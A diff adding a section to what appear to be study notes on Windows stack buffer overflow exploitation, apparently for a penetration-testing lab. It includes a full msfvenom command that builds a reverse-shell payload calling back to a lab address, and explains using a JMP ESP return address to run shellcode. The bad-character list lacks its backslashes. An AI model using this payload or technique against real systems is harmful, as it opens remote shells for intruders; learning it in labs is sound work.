@@ -181,3 +181,17 @@ do not appear in the dump are bad characters. Once you do this, you will have co
 of the EIP, have space for your shellcode and know which characters you cannot include.
 The ESP address changes between crashes, so we can't just hard code an address into the 
 exploit. 
+
+When you get your bad characters you need to tell msfvenom they are bad with the 
+-b flag:
+
+msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.119.182 LPORT=42069 EXITFUNC=thread -f raw -b x00x0ax1ax2fx95xa7 -o exploit.txt
+
+
+FINDING A RETURN ADDRESS:
+To ensure we have a consistent place to leverage our shellcode we can capture 
+the JMP ESP instruction. This will jump to the address in the ESP when executed.
+If we find a static address with this instruction, we can redirect the EIP to 
+that address, ensuring we always get the code to run. 
+
+
